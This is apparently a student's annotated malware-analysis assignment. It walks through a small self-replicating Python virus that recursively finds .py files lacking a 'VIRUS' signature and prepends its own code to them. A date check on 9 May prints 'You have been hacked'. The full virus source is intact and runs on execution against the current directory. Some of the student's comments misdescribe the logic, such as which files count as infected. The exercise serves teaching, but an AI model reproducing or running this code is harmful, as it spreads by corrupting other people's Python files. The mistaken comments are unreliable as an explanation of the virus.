#!/usr/bin/python3
#Geneva Knott
#30 March 2023
#Malicious Code
#Perform an analysis of the Python-based code.

#Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
#Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
#Insert comments above the final three lines explaining how the functions are called and what this script appears to do.

# OS module to interact with the underlying operating system
import os

#the datetime module supplies classes for manipulating dates and times
import datetime

#"SIGNATURE" is the name of a variable and "VIRUS" is the value assigned to it.
SIGNATURE = "VIRUS"

#def is used to define a function, fuction is named "locate", parenthesis specify the paramters of the fucntion. Thecolon indicates the start of fucntion body. 
#Locates files in a directory, and stores them in a varible "filelist"
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    #A loop that checks for "fnam" in "filelist"
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # If "fname" is not in "filelist", the elif statment checks for a .py extentions
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                #If there is a python script, it checks for the presence of the var "signature"
                if SIGNATURE in line:
                    infected = True
                    break
            # If signature is not found, it is considered "infected" its path is added to "files_targeted" using append
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted
# this code defines a new fucntion, to infect files in "file_targeted"
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    #this string would contain the contents of the virus
    #The purpose of this code is to extract the virus code from the current script file and store it in memory as a string so that it can be inserted into other Python files that the virus is infecting.
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    #This code infects the python listed in "fele_targeted"
    for fname in files_targeted:
        #This opens the "fname" to read its contents then closes it
        f = open(fname)
        temp = f.read()
        f.close()
        # This code opens the fucntion with a W argument to write to overwrite the new virus code
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# Defines a new function, that checks if date is May 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If date is May 9th it will print "you have been hacked"
        print("You have been hacked")
# This calls all the functions that were created above and detonates the virus to infect the python files
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()